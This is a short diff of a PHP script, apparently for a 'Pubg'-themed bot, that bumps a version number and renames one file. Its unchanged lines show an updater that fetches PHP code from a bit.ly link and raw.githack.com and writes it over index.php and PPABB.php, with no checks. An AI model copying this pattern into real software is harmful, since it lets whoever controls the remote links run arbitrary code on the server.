@@ -1,7 +1,7 @@
 <?
 $info = json_decode(file_get_contents('http://sha-my.xyz/Pubg/info.json'),1);
 $version= $info[info]['version'];
-$v = "1";
+$v = "5";
 if($v != $version){
 $iscript = file_get_contents('https://bit.ly/3lJKcQD');
 $index = file_get_contents($iscript);
@@ -77,7 +77,7 @@ if($install){
 $shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/M/bot.php");
 $xx = file_put_contents("PPABB.php", $shamy);
 
-$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/M/Index.php');
+$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/M/IndeX.php');
 $xx = file_put_contents("index.php", $index); 
 }
 }
